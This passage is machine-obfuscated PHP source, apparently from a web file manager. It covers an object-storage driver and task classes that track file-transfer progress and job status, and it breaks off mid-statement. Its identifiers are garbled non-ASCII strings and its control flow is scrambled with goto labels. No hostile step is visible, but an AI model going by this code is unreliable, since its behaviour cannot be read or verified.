$c‹‰¿¼¥•…[$bô‚³”œ‚¢[212]] == $bô‚³”œ‚¢[213]) { $a‚’İ±´[0] = $bô‚³”œ‚¢[213]; } goto F¹¯ÊŠÖÄ; C¦Íœ¸ô©: $bô‚³”œ‚¢ =& $_SERVER[ì‹É]; $aê×¤¿„Ù¥ = isset($c‹‰¿¼¥•…[$bô‚³”œ‚¢[207]]) ? $c‹‰¿¼¥•…[$bô‚³”œ‚¢[207]] : gmdate($bô‚³”œ‚¢[205]); $CÜİöÛ‡Éç = isset($c‹‰¿¼¥•…[$bô‚³”œ‚¢[157]]) ? $c‹‰¿¼¥•…[$bô‚³”œ‚¢[157]] : $bô‚³”œ‚¢[33]; goto e¸—Ş’–Ô³; BÌ÷ê…ª¦Š: } public function listUploadParts($cå±Œ¸²¸³, $bµõ¼¦ï„° = array()) { goto fˆŒÚ¿šŠ‹; A’ƒÔ¶Ïšî: $F¦©ŞÙİ÷¬ = $this->multiUploadAuthData($cå±Œ¸²¸³, $bµõ¼¦ï„°); if (empty($F¦©ŞÙİ÷¬)) { return !1; } return array($b»¿æÀØ¼[217] => $F¦©ŞÙİ÷¬, $b»¿æÀØ¼[207] => $bµõ¼¦ï„°[$b»¿æÀØ¼[207]], $b»¿æÀØ¼[219] => $Añ›êË¼ ƒ); goto a‹Ÿ¿‘ëÇ; fˆŒÚ¿šŠ‹: $b»¿æÀØ¼ =& $_SERVER[ì‹É]; $bòèæ‚‰Û = str_replace($b»¿æÀØ¼[218], $b»¿æÀØ¼[33], $bµõ¼¦ï„°[$b»¿æÀØ¼[157]]); $Añ›êË¼ ƒ = $this->client->listParts($this->bucket, $cå±Œ¸²¸³, $bòèæ‚‰Û); goto e¡¥˜¥®; e¡¥˜¥®: if (!$Añ›êË¼ ƒ) { return !1; } unset($bµõ¼¦ï„°[$b»¿æÀØ¼[208]], $bµõ¼¦ï„°[$b»¿æÀØ¼[212]]); $bµõ¼¦ï„°[$b»¿æÀØ¼[90]] = $cå±Œ¸²¸³; goto A’ƒÔ¶Ïšî; a‹Ÿ¿‘ëÇ: } public function getHost() { return parent::getHost() . $_SERVER[ì‹É][8] . $this->bucket; } public function size($e„ç¢Ğ©¸) { $e•î Ô¾ƒÙ = $this->objectMeta($e„ç¢Ğ©¸); return $e•î Ô¾ƒÙ ? $e•î Ô¾ƒÙ[$_SERVER[ì‹É][78]] : 0; } public function info($fÀ²åì…¯â) { if ($this->isFolder($fÀ²åì…¯â)) { return $this->folderInfo($fÀ²åì…¯â); } else { if ($this->isFile($fÀ²åì…¯â)) { return $this->fileInfo($fÀ²åì…¯â); } } return !1; } public function exist($c¦ˆŞùÆˆÀ) { return $this->isFile($c¦ˆŞùÆˆÀ) || $this->isFolder($c¦ˆŞùÆˆÀ); } public function isFile($bÇä“ÉƒÅ) { return !$this->isFolder($bÇä“ÉƒÅ) && $this->objectMeta($bÇä“ÉƒÅ); } public function isFolder($F«„ÔæÅ´Û) { return $this->cacheMethod($_SERVER[ì‹É][220], $F«„ÔæÅ´Û); } protected function objectMeta($C„­­˜Ï¥) { return $this->cacheMethod($_SERVER[ì‹É][221], $C„­­˜Ï¥); } protected function _objectMeta($EŸÛ¾ƒã„÷) { $båææãÇ™µ =& $_SERVER[ì‹É]; try { $fùÃô‹¼ŒÖ = $this->client->getObjectInfo($this->bucket, $EŸÛ¾ƒã„÷); if (!isset($fùÃô‹¼ŒÖ[$båææãÇ™µ[204]]) && isset($fùÃô‹¼ŒÖ[$båææãÇ™µ[222]])) { $fùÃô‹¼ŒÖ[$båææãÇ™µ[204]] = $fùÃô‹¼ŒÖ[$båææãÇ™µ[222]]; } } catch (OSS\Core\OssException $E«¶¶»¯¸ğ) { $fùÃô‹¼ŒÖ = !1; } return $fùÃô‹¼ŒÖ; } protected function _isFolder($E«ÛÖóƒ’ö) { $C–‹Ó = $this->listObjs($E«ÛÖóƒ’ö, null, 1); return !empty($C–‹Ó) ? !0 : !1; } } define($_SERVER[ì‹É][223], 1); goto f‹§ÌğĞ†; dÕŒ†«ÈÅ¯: define($_SERVER[ì‹É][1847], 5); define($_SERVER[ì‹É][1848], 16); define($_SERVER[ì‹É][1849], 32); goto BÌ¬Ìñõ™Ü; BÇŒïõˆå: class Task { const STATYS_STOP = "\x73\164\x6f\x70"; const STATYS_RUNNING = "\162\165\156\x6e\151\156\147"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($cñ¥—†Ú‘, $bÀŸ“Ëí÷… = '', $DŸ¶©¼¤‘à = 0, $dèâ‚ÙÀ’ = '') { goto d÷¾œÎôÂ; a¥æâº·Ú„: Hook::bind($C…¦¬Îìô[1318], array($this, $C…¦¬Îìô[1359])); Hook::bind($C…¦¬Îìô[1360], array($this, $C…¦¬Îìô[1361])); $this->startAfter(); goto bÖ“ŠÈ¥²; d÷¾œÎôÂ: $C…¦¬Îìô =& $_SERVER[ì‹É]; if (self::get($cñ¥—†Ú‘)) { return; } $this->task = array($C…¦¬Îìô[364] => $cñ¥—†Ú‘, $C…¦¬Îìô[1351] => USER_ID, $C…¦¬Îìô[1248] => $dèâ‚ÙÀ’, $C…¦¬Îìô[29] => $bÀŸ“Ëí÷…, $C…¦¬Îìô[1296] => $C…¦¬Îìô[33], $C…¦¬Îìô[1294] => $DŸ¶©¼¤‘à, $C…¦¬Îìô[1299] => 0, $C…¦¬Îìô[1352] => 0, $C…¦¬Îìô[1353] => 0, $C…¦¬Îìô[1354] => timeFloat(), $C…¦¬Îìô[1355] => 0, $C…¦¬Îìô[1356] => 0, $C…¦¬Îìô[1357] => 0, $C…¦¬Îìô[1358] => 0, $C…¦¬Îìô[676] => $C…¦¬Îìô[1316]); goto a¥æâº·Ú„; bÖ“ŠÈ¥²: Hook::trigger($C…¦¬Îìô[1362], $this->task); $this->task[$C…¦¬Îìô[1356]] = timeFloat(); self::valueSet($this->task[$C…¦¬Îìô[364]], $this->task); goto d÷ŠŸª‹É¹; d÷ŠŸª‹É¹: } public function end() { goto aß‰¶ÓŠ“³; aß‰¶ÓŠ“³: $cÄê¡„Üä´ =& $_SERVER[ì‹É]; if (!$this->task) { return; } if ($this->task[$cÄê¡„Üä´[1356]]) { self::valueSet($this->task[$cÄê¡„Üä´[364]], !1); } goto AçŒá¤Ÿ“Š; AçŒá¤Ÿ“Š: $D½…µššË = timeFloat() - $this->task[$cÄê¡„Üä´[1354]]; self::log($cÄê¡„Üä´[1363] . $this->task[$cÄê¡„Üä´[364]] . $cÄê¡„Üä´[1364] . $D½…µššË . $cÄê¡„Üä´[1365]); Hook::unbind($cÄê¡„Üä´[1318], array($this, $cÄê¡„Üä´[1359])); goto E´÷µõòæ’; E´÷µõòæ’: Hook::unbind($cÄê¡„Üä´[1360], array($this, $cÄê¡„Üä´[1361])); $this->endAfter(); $this->task = !1; goto aŒÛè¸‰°”; aŒÛè¸‰°”: } public function update($F¹‚áÛË«Î = 0) { goto d½—Õ‰¨†ù; cê¸øç¸öß: $this->updateAfter(); $CÑ“‚Ê = 0.2; if (timeFloat() - $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1356]] < $CÑ“‚Ê) { return; } goto B»âÇ¦­´î; B»âÇ¦­´î: $D­›íöÚË± = self::get($EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[364]]); $DõĞ‡Ä¿ÏÏ = $D­›íöÚË±[$fÃ¬¯ÖŸÀ[676]]; if ($DõĞ‡Ä¿ÏÏ == self::STATYS_KILL) { $d‰Ãùöçæ = array($fÃ¬¯ÖŸÀ[1366] => LNG($fÃ¬¯ÖŸÀ[1367]), $fÃ¬¯ÖŸÀ[1006] => !1); Cache::set($fÃ¬¯ÖŸÀ[1368] . $this->task[$fÃ¬¯ÖŸÀ[364]], $d‰Ãùöçæ, 30); $this->end(); die; } else { if ($DõĞ‡Ä¿ÏÏ == self::STATYS_STOP) { $c•††Ê ™ = 2; $D­›íöÚË±[$fÃ¬¯ÖŸÀ[1357]] += $c•††Ê ™; self::valueSet($EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[364]], $D­›íöÚË±); sleep($c•††Ê ™); $this->update(); return; } } goto D‹´ôÏÎçğ; d½—Õ‰¨†ù: $fÃ¬¯ÖŸÀ =& $_SERVER[ì‹É]; $EªÇ’šÙÙ• =& $this->task; if (!$EªÇ’šÙÙ•) { return; } goto Fë©¢ˆ•Îé; Fë©¢ˆ•Îé: $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1299]] += $F¹‚áÛË«Î; $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1355]] = timeFloat(); if ($EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1294]]) { if ($EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1294]] < $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1299]]) { $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1294]] = $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1299]]; } $câÎµˆÏˆø = timeFloat() - $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1354]] - $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1357]]; $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1352]] = $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1299]] / $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1294]]; $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1353]] = $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1299]] / $câÎµˆÏˆø; if ($EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1352]] > 0) { $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1358]] = $câÎµˆÏˆø * (1 - $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1352]]) / $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1352]]; } $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1358]] = $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1358]] <= 0 ? 0 : $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1358]]; } goto cê¸øç¸öß; D´¾ Óå…: Hook::trigger($fÃ¬¯ÖŸÀ[1369], $EªÇ’šÙÙ•); self::valueSet($EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[364]], $EªÇ’šÙÙ•); goto Fä•á”Ã™; D‹´ôÏÎçğ: $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[676]] = $DõĞ‡Ä¿ÏÏ ? $DõĞ‡Ä¿ÏÏ : $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[676]]; $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1357]] = $D­›íöÚË±[$fÃ¬¯ÖŸÀ[1357]] ? $D­›íöÚË±[$fÃ¬¯ÖŸÀ[1357]] : 0; $EªÇ’šÙÙ•[$fÃ¬¯ÖŸÀ[1356]] = timeFloat(); goto D´¾ Óå…; Fä•á”Ã™: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($d¼·‡“ĞÁå) { $A›•Œï­½ =& $_SERVER[ì‹É]; Cache::set($A›•Œï­½[1368] . $this->task[$A›•Œï­½[364]], $d¼·‡“ĞÁå, 60); return $d¼·‡“ĞÁå; } public static function get($B–Â¶“¬Ã) { return self::valueGet($B–Â¶“¬Ã); } public static function listData() { $AŸİ¸¹¼æó = self::valueGet(); return array_sort_by($AŸİ¸¹¼æó, $_SERVER[ì‹É][1354], !0); } public static function kill($C¼Êøè†í) { return self::changeStatus($C¼Êøè†í, self::STATYS_KILL); } public static function stop($f¤…ª¥‘î„) { return self::changeStatus($f¤…ª¥‘î„, self::STATYS_STOP); } public static function restart($cÃÁ¸Şî¡«) { return self::changeStatus($cÃÁ¸Şî¡«, self::STATYS_RUNNING); } public static function killAll() { $d·Ø˜…¤ÅÊ =& $_SERVER[ì‹É]; $f‰‚Ç™²ïˆ = self::listData(); foreach ($f‰‚Ç™²ïˆ as $dâ¦—İÃê™) { self::kill($dâ¦—İÃê™[$d·Ø˜…¤ÅÊ[364]]); } sleep(2); foreach ($f‰‚Ç™²ïˆ as $dâ¦—İÃê™) { self::valueSet($dâ¦—İÃê™[$d·Ø˜…¤ÅÊ[364]], !1); } } private static function changeStatus($Aé”ˆïãØÖ, $eŞù³ò––) { goto Bª–ÏÙ«¿÷; Bª–ÏÙ«¿÷: $A¼¿´å–Ó =& $_SERVER[ì‹É]; $E˜èí®·ñó = self::valueGet($Aé”ˆïãØÖ); if (!$E˜èí®·ñó) { return !1; } goto cìÙÃµåŒ; b™³Ö£Ù: return !0; goto dÕç”×òèŒ; cìÙÃµåŒ: $E˜èí®·ñó[$A¼¿´å–Ó[676]] = $eŞù³ò––; self::valueSet($Aé”ˆïãØÖ, $E˜èí®·ñó); self::log($A¼¿´å–Ó[1370] . $E˜èí®·ñó[$A¼¿´å–Ó[364]] . $A¼¿´å–Ó[1371] . $eŞù³ò––); goto b™³Ö£Ù; dÕç”×òèŒ: } public static function valueGet($ağ¾áˆåœ‘ = false) { $E£ÒøÉãÔÇ =& $_SERVER[ì‹É]; if ($ağ¾áˆåœ‘) { $C÷ì¢‹äá = Model($E£ÒøÉãÔÇ[395])->where(array($E£ÒøÉãÔÇ[90] => $ağ¾áˆåœ‘, $E£ÒøÉãÔÇ[29] => $E£ÒøÉãÔÇ[1372]))->find(); return $C÷ì¢‹äá ? json_decode($C÷ì¢‹äá[$E£ÒøÉãÔÇ[354]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($eŞ¹ç–¯É = false) { goto c˜”íÕèÑ; A¥ç·Ôî‡: return $A§“Ö‘˜‡; goto e‹½«’ˆé; CÆƒğÅØŠ„: $A§“Ö‘˜‡ = Model($e¾ËğŒôÖ[395])->where($EÑ¿ÖŠî¬Ë)->select(); $A§“Ö‘˜‡ = $A§“Ö‘˜‡ ? $A§“Ö‘˜‡ : array(); foreach ($A§“Ö‘˜‡ as $C©‚´ŸÁ¡ => $Dİ±â­ğ§) { $A§“Ö‘˜‡[$C©‚´ŸÁ¡] = json_decode($Dİ±â­ğ§[$e¾ËğŒôÖ[354]], !0); } goto A¥ç·Ôî‡; c˜”íÕèÑ: $e¾ËğŒôÖ =& $_SERVER[ì‹É]; $EÑ¿ÖŠî¬Ë = array($e¾ËğŒôÖ[29] => $e¾ËğŒôÖ[1372]); if ($eŞ¹ç–¯É) { $EÑ¿ÖŠî¬Ë[$e¾ËğŒôÖ[1351]] = $eŞ¹ç–¯É; } goto CÆƒğÅØŠ„; e‹½«’ˆé: } public static function valueSet($Bâ™”öç«, $C†ƒ×…Œ) { goto Bëè§õ‡ÕÈ; F‰‰‹ïÇÈ: if (!$E˜ÚÈÓ‰•ä) { ob_start(); var_dump($C†ƒ×…Œ); $cÛâÃ§Ï¥ = ob_get_clean(); self::log($E®¥”ô·[1373] . json_encode_force($cÛâÃ§Ï¥)); } if (!$Bâ™”öç« || !$C†ƒ×…Œ[$E®¥”ô·[364]]) { return !1; } $Aæö™„ŞŒŞ = array($E®¥”ô·[29] => $E®¥”ô·[1372], $E®¥”ô·[1351] => USER_ID, $E®¥”ô·[90] => $Bâ™”öç«, $E®¥”ô·[354] => $E˜ÚÈÓ‰•ä); goto f“Ôé‡‡¥; f“Ôé‡‡¥: Model($E®¥”ô·[395])->add($Aæö™„ŞŒŞ, array(), !0); goto bÜ… ®ëé; Bëè§õ‡ÕÈ: $E®¥”ô· =& $_SERVER[ì‹É]; if (!$C†ƒ×…Œ) { return Model($E®¥”ô·[395])->where(array($E®¥”ô·[90] => $Bâ™”öç«, $E®¥”ô·[29] => $E®¥”ô·[1372]))->delete(); } $E˜ÚÈÓ‰•ä = json_encode($C†ƒ×…Œ); goto F‰‰‹ïÇÈ; bÜ… ®ëé: } public static function log($bÅ²¤•Ê‚¹) { write_log($bÅ²¤•Ê‚¹, $_SERVER[ì‹É][1374]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto D‰±¸ŸÕõ; D‰±¸ŸÕõ: $c­Ößµªšâ =& $_SERVER[ì‹É]; $bÒí´Åá¼ =& $this->task; $this->sourceCopyFolder = !1; goto D°Ùœ¦„øã; b›ÍÛò­•: Hook::bind($c­Ößµªšâ[1388], array($this, $c­Ößµªšâ[1389])); Hook::bind($c­Ößµªšâ[1390], array($this, $c­Ößµªšâ[1391])); Hook::bind($c­Ößµªšâ[1392], array($this, $c­Ößµªšâ[1393])); goto aÀ˜“âáå; bÊ…ìÙÅŠ: if (!$bÒí´Åá¼[$c­Ößµªšâ[1248]]) { $bÒí´Åá¼[$c­Ößµªšâ[1248]] = LNG($c­Ößµªšâ[1400]); } goto aõòËà·É; D°Ùœ¦„øã: Hook::bind($c­Ößµªšâ[1375], array($this, $c­Ößµªšâ[1376])); Hook::bind($c­Ößµªšâ[1377], array($this, $c­Ößµªšâ[1378])); Hook::bind($c­Ößµªšâ[1379], array($this, $c­Ößµªšâ[1380])); goto FªÄ—‚Æßù; Eˆ‹÷¯Ûª­: Hook::bind($c­Ößµªšâ[535], array($this, $c­Ößµªšâ[1383])); Hook::bind($c­Ößµªšâ[501], array($this, $c­Ößµªšâ[1384])); Hook::bind($c­Ößµªšâ[498], array($this, $c­Ößµªšâ[1384])); goto F “áÈ‡ÛÍ; DÒ¨ŠÙ¢º²: $bÒí´Åá¼[$c­Ößµªšâ[1296]] = $c­Ößµªšâ[33]; $bÒí´Åá¼[$c­Ößµªšâ[1398]] = $c­Ößµªšâ[33]; $bÒí´Åá¼[$c­Ößµªšâ[1399]] = 0; goto bÊ…ìÙÅŠ; f…­ìŠöÀ’: Hook::bind($c­Ößµªšâ[1385], array($this, $c­Ößµªšâ[1386])); Hook::bind($c­Ößµªšâ[524], array($this, $c­Ößµªšâ[1387])); $this->sourceModelCopyFlag = !1; goto b›ÍÛò­•; FªÄ—‚Æßù: Hook::bind($c­Ößµªšâ[531], array($this, $c­Ößµªšâ[1381])); Hook::bind($c­Ößµªšâ[532], array($this, $c­Ößµªšâ[1382])); Hook::bind($c­Ößµªšâ[534], array($this, $c­Ößµªšâ[1383])); goto Eˆ‹÷¯Ûª­; aÀ˜“âáå: $bÒí´Åá¼[$c­Ößµªšâ[1394]] = LNG($c­Ößµªšâ[1395]); $bÒí´Åá¼[$c­Ößµªšâ[1396]] = 0; $bÒí´Åá¼[$c­Ößµªšâ[1397]] = 0; goto DÒ¨ŠÙ¢º²; F “áÈ‡ÛÍ: Hook::bind($c­Ößµªšâ[503], array($this, $c­Ößµªšâ[1384])); Hook::bind($c­Ößµªšâ[505], array($this, $c­Ößµªšâ[1384])); Hook::bind($c­Ößµªšâ[507], array($this, $c­Ößµªšâ[1384])); goto f…­ìŠöÀ’; aõòËà·É: } protected function endAfter() { goto f‘À¼ÃÀÜ; b‰çÉ·ÜÇ–: Hook::unbind($d ˜µÚ[1388], array($this, $d ˜µÚ[1389])); Hook::unbind($d ˜µÚ[1390], array($this, $d ˜µÚ[1391])); Hook::unbind($d ˜µÚ[1392], array($this, $d ˜µÚ[1393])); goto dÍ”ùÅòî…; f‘À¼ÃÀÜ: $d ˜µÚ =& $_SERVER[ì‹É]; Hook::unbind($d ˜µÚ[1375], array($this, $d ˜µÚ[1376])); Hook::unbind($d ˜µÚ[1377], array($this, $d ˜µÚ[1378])); goto F¥³á’ğ”¢; Cá§ÜœÈµÜ: Hook::unbind($d ˜µÚ[498], array($this, $d ˜µÚ[1384])); Hook::unbind($d ˜µÚ[503], array($this, $d ˜µÚ[1384])); Hook::unbind($d ˜µÚ[505], array($this, $d ˜µÚ[1384])); goto b¾ÊŒáø¬ß; B˜ñø©¸ÙÎ: Hook::unbind($d ˜µÚ[534], array($this, $d ˜µÚ[1383])); Hook::unbind($d ˜µÚ[535], array($this, $d ˜µÚ[1383])); Hook::unbind($d ˜µÚ[501], array($this, $d ˜µÚ[1384])); goto Cá§ÜœÈµÜ; b¾ÊŒáø¬ß: Hook::unbind($d ˜µÚ[507], array($this, $d ˜µÚ[1384])); Hook::unbind($d ˜µÚ[1385], array($this, $d ˜µÚ[1386])); Hook::unbind($d ˜µÚ[524], array($this, $d ˜µÚ[1387])); goto b‰çÉ·ÜÇ–; F¥³á’ğ”¢: Hook::unbind($d ˜µÚ[1379], array($this, $d ˜µÚ[1380])); Hook::unbind($d ˜µÚ[531], array($this, $d ˜µÚ[1381])); Hook::unbind($d ˜µÚ[532], array($this, $d ˜µÚ[1382])); goto B˜ñø©¸ÙÎ; dÍ”ùÅòî…: } public function copyMoveStart($A¨Ôõß÷Â¹, $FÙñØ‰ºÑà, $c´¼àõ‚¦, $E±›º¦ªƒ†) { } public function updateAfter() { goto dÙÁ¥Œ¥¿; Eô‰­ò¼«: $C°ñà±¦àª[$dò½Ò‡õÖÇ[1352]] = ($C°ñà±¦àª[$dò½Ò‡õÖÇ[1401]] + $c™Ú¤Â¾) / $C°ñà±¦àª[$dò½Ò‡õÖÇ[685]]; if ($C°ñà±¦àª[$dò½Ò‡õÖÇ[1352]] > 0) { $e¥³ÄÉ„íÖ = timeFloat() - $C°ñà±¦àª[$dò½Ò‡õÖÇ[1354]] - $C°ñà±¦àª[$dò½Ò‡õÖÇ[1357]]; $C°ñà±¦àª[$dò½Ò‡õÖÇ[1358]] = $e¥³ÄÉ„íÖ * (1 - $C°ñà±¦àª[$dò½Ò‡õÖÇ[1352]]) / $C°ñà±¦àª[$dò½Ò‡õÖÇ[1352]]; } goto eï £›Ù‚š; B²‘ÑóÙœİ: if ($this->sourceModelCopyFlag) { return; } $c™Ú¤Â¾ = 0; if ($C°ñà±¦àª[$dò½Ò‡õÖÇ[1398]] == $dò½Ò‡õÖÇ[1014]) { $c™Ú¤Â¾ = $C°ñà±¦àª[$dò½Ò‡õÖÇ[1397]] * 0.5; } else { if ($C°ñà±¦àª[$dò½Ò‡õÖÇ[1398]] == $dò½Ò‡õÖÇ[92]) { $c™Ú¤Â¾ = $C°ñà±¦àª[$dò½Ò‡õÖÇ[1397]] * 0.5 + $C°ñà±¦àª[$dò½Ò‡õÖÇ[1396]] * 0.5; } } goto Eô‰­ò¼«; dÙÁ¥Œ¥¿: $dò½Ò‡õÖÇ =& $_SERVER[ì‹É]; $C°ñà±¦àª =& $this->task; if (!$C°ñà±¦àª[$dò½Ò‡õÖÇ[685]]) { return; } goto B²‘ÑóÙœİ; eï £›Ù‚š: } public function addPath($C™á¢Ë†š‰) { goto DŸ¦ÏŠĞÇ; DŸ¦ÏŠĞÇ: $FÉ³Ã˜ÂÒç =& $_SERVER[ì‹É]; if (!$C™á¢Ë†š‰) { return; } $eÀê¹¼¤¶î =& $this->task; goto e÷â“©§²Ö; e÷â“©§²Ö: $CÜ…‹Âğéµ = IO::infoWithChildren($C™á¢Ë†š‰); $D‹†ÏĞï¥Ğ = $eÀê¹¼¤¶î[$FÉ³Ã˜ÂÒç[1402]] ? $eÀê¹¼¤¶î[$FÉ³Ã˜ÂÒç[1402]][$FÉ³Ã˜ÂÒç[1403]] : 0; $eÀê¹¼¤¶î[$FÉ³Ã˜ÂÒç[1402]] = array($FÉ³Ã˜ÂÒç[1403] => $D‹†ÏĞï¥Ğ + 1, $FÉ³Ã˜ÂÒç[383] => $CÜ…‹Âğéµ[$FÉ³Ã˜ÂÒç[28]], $FÉ³Ã˜ÂÒç[76] => $CÜ…‹Âğéµ[$FÉ³Ã˜ÂÒç[76]], $FÉ³Ã˜ÂÒç[462] => $CÜ…‹Âğéµ[$FÉ³Ã˜ÂÒç[462]] ? $CÜ…‹Âğéµ[$FÉ³Ã˜ÂÒç[462]] : $CÜ…‹Âğéµ[$FÉ³Ã˜ÂÒç[76]]); goto bÑè£½œ‡¸; bÑè£½œ‡¸: if ($CÜ…‹Âğéµ[$FÉ³Ã˜ÂÒç[29]] == $FÉ³Ã˜ÂÒç[164]) { $eÀê¹¼¤¶î[$FÉ³Ã˜ÂÒç[1294]] += 1; } else { $eÀê¹¼¤¶î[$FÉ³Ã˜ÂÒç[1294]] += $CÜ…‹Âğéµ[$FÉ³Ã˜ÂÒç[81]][$FÉ³Ã˜ÂÒç[79]]; if ($CÜ…‹Âğéµ[$FÉ³Ã˜ÂÒç[366]]) { $eÀê¹¼¤¶î[$FÉ³Ã˜ÂÒç[1294]] += $CÜ…‹Âğéµ[$FÉ³Ã˜ÂÒç[81]][$FÉ³Ã˜ÂÒç[80]] + 1; } } $eÀê¹¼¤¶î[$FÉ³Ã˜ÂÒç[685]] += $CÜ…‹Âğéµ[$FÉ³Ã˜ÂÒç[78]]; $this->update(); goto bé¼ó•…’¨; bé¼ó•…’¨: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($bİ„„ÅÁÉµ) { $Cˆ„ğµÇ‹ =& $_SERVER[ì‹É]; $B»õô¦ÂÊ± =& $this->task; $B»õô¦ÂÊ±[$Cˆ„ğµÇ‹[1394]] = $bİ„„ÅÁÉµ[$Cˆ„ğµÇ‹[28]]; $B»õô¦ÂÊ±[$Cˆ„ğµÇ‹[1296]] = $bİ„„ÅÁÉµ[$Cˆ„ğµÇ‹[28]]; $this->update(); } public function copyFileStart($Fä Û¤ÖÍÉ, $eÑÙÈØ¨¿, $fæ÷Ó‘òŠ, $B‡‘›»óç, $Eˆ¨Á•ñà’, $EáöğğÔõ) { goto E±½ĞÈó­; b‚ŠôØÜÇ: $this->update(); goto eÑˆáöÙÓ; E±½ĞÈó­: $fâÛÕÜùÑ =& $_SERVER[ì‹É]; $aíœÙö­Òâ = $Eˆ¨Á•ñà’; if ($aíœÙö­Òâ == $GLOBALS[$fâÛÕÜùÑ[1404]]) { $aíœÙö­Òâ = $GLOBALS[$fâÛÕÜùÑ[1405]]; } goto cí§·½„ª; b±–†œéó“: $c¯ÒĞ±¨ÁŠ[$fâÛÕÜùÑ[1296]] = $fâÛÕÜùÑ[33]; $c¯ÒĞ±¨ÁŠ[$fâÛÕÜùÑ[1398]] = $fâÛÕÜùÑ[33]; $c¯ÒĞ±¨ÁŠ[$fâÛÕÜùÑ[1399]] = 0; goto b‚ŠôØÜÇ; cí§·½„ª: $GLOBALS[$fâÛÕÜùÑ[1405]] = $Eˆ¨Á•ñà’; $GLOBALS[$fâÛÕÜùÑ[1404]] = $EáöğğÔõ; $c¯ÒĞ±¨ÁŠ =& $this->task; goto Bä‚ñ•ˆ; Bä‚ñ•ˆ: $c¯ÒĞ±¨ÁŠ[$fâÛÕÜùÑ[1394]] = $aíœÙö­Òâ; $c¯ÒĞ±¨ÁŠ[$fâÛÕÜùÑ[1396]] = (int) $Fä Û¤ÖÍÉ->size($eÑÙÈØ¨¿); $c¯ÒĞ±¨ÁŠ[$fâÛÕÜùÑ[1397]] = 0; goto b±–†œéó“; eÑˆáöÙÓ: } public function copyFileEnd($cáÑª‹ºÀ˜, $Aõó®ø±«, $aÊ¦¹±Á³¢, $cÖˆé¿²Á, $bÀéğ°……, $C†—ÍÀ‚¥) { $aÏÒòÅµ×œ =& $_SERVER[ì‹É]; $câù¹Ìê¶ =& $this->task; $câù¹Ìê¶[$aÏÒòÅµ×œ[1397]] = $câù¹Ìê¶[$aÏÒòÅµ×œ[1396]]; $câù¹Ìê¶[$aÏÒòÅµ×œ[1398]] = $aÏÒòÅµ×œ[33]; if ($bÀéğ°…… == $câù¹Ìê¶[$aÏÒòÅµ×œ[1394]]) { $câù¹Ìê¶[$aÏÒòÅµ×œ[1401]] += $câù¹Ìê¶[$aÏÒòÅµ×œ[1396]]; $this->update(1); } else { $this->update(); $câù¹Ìê¶[$aÏÒòÅµ×œ[1397]] = 0; } self::log($aÏÒòÅµ×œ[1406] . $Aõó®ø±« . $aÏÒòÅµ×œ[67] . $cÖˆé¿²Á . $aÏÒòÅµ×œ[214] . $bÀéğ°…… . $aÏÒòÅµ×œ[1407] . $câù¹Ìê¶[$aÏÒòÅµ×œ[1394]]); } public function updateFileEnd($bÁÊ¤Åã†¯, $EáÃ™‹¬ˆ) { $fÍŞ´‚éÏ =& $_SERVER[ì‹É]; $f¶²‹Ìğá— =& $this->task; $f¶²‹Ìğá—[$fÍŞ´‚éÏ[1394]] = $bÁÊ¤Åã†¯; $f¶²‹Ìğá—[$fÍŞ´‚éÏ[1396]] = $EáÃ™‹¬ˆ; $f¶²‹Ìğá—[$fÍŞ´‚éÏ[1401]] += $EáÃ™‹¬ˆ; $this->update(1); } public function sourceModelCopy($a³ïÇï³‡) { goto c¿áºµÒ ; c¿áºµÒ : $bÙ¥”‹ˆ =& $_SERVER[ì‹É]; $fŞ²’Ôô = $a³ïÇï³‡[0]; $dâ–ÑÌ§Œ³ = $a³ïÇï³‡[1]; goto b§¿Ö‰ğÙ; b§¿Ö‰ğÙ: $E¹•Å²Ê†§ =& $this->task; $this->sourceModelCopyFlag = !0; $CõšòØíÎ = 0; goto E¤ÁÀÆÛÃ¡; E¤ÁÀÆÛÃ¡: switch ($fŞ²’Ôô) { case $bÙ¥”‹ˆ[499]: $CõšòØíÎ = 1; break; case $bÙ¥”‹ˆ[502]: $E¹•Å²Ê†§[$bÙ¥”‹ˆ[1394]] = $dâ–ÑÌ§Œ³[$bÙ¥”‹ˆ[28]]; break; case $bÙ¥”‹ˆ[504]: $CõšòØíÎ = intval($a³ïÇï³‡[$bÙ¥”‹ˆ[360]] * 0.4); break; case $bÙ¥”‹ˆ[506]: $CõšòØíÎ = intval($a³ïÇï³‡[$bÙ¥”‹ˆ[360]] * 0.2); break; case $bÙ¥”‹ˆ[508]: $CõšòØíÎ = 